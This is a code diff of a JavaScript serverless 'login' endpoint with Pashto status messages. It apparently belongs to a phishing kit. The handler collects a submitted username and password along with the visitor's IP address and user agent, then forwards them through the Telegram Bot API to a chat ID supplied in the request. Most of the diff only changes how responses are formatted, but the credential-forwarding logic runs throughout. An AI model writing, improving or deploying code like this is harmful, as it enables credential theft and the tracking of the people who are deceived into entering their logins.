@@ -1,16 +1,17 @@
+// api/login.js
+import fetch from 'node-fetch';
+
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
-    return res.status(405).send('❌ Only POST requests allowed');
+    return res.status(405).json({ error: '❌ Only POST requests allowed' });
   }
 
   const { username, password, uid } = req.body;
 
-  // Validate input
   if (!username || !password || !uid) {
-    return res.status(400).send('❗ ټول فیلډونه ضروري دي.');
+    return res.status(400).json({ error: '❗ ټول فیلډونه ضروري دي.' });
   }
 
-  // Extract IP
   const forwarded = req.headers['x-forwarded-for'];
   const ip = Array.isArray(forwarded) ? forwarded[0] : forwarded || req.socket.remoteAddress || 'unknown';
   const userAgent = req.headers['user-agent'] || 'unknown';
@@ -39,8 +40,9 @@ export default async function handler(req, res) {
 `;
 
   const token = process.env.BOT_TOKEN;
+
   if (!token) {
-    return res.status(500).send('❌ BOT_TOKEN نه دی تعریف شوی!');
+    return res.status(500).json({ error: '❌ BOT_TOKEN نه دی تعریف شوی!' });
   }
 
   try {
@@ -48,7 +50,7 @@ export default async function handler(req, res) {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: uid,
+        chat_id: String(uid),
         text: message,
         parse_mode: "Markdown"
       })
@@ -60,9 +62,9 @@ export default async function handler(req, res) {
       throw new Error(telegramData.description || "Telegram API Error");
     }
 
-    res.status(200).send('✅ معلومات واستول شول!');
+    return res.status(200).json({ message: '✅ معلومات واستول شول!' });
   } catch (err) {
     console.error("Telegram error:", err);
-    res.status(500).send('❌ Telegram ته لیږد ناکام شو.');
+    return res.status(500).json({ error: '❌ Telegram ته لیږد ناکام شو.' });
   }
 } 
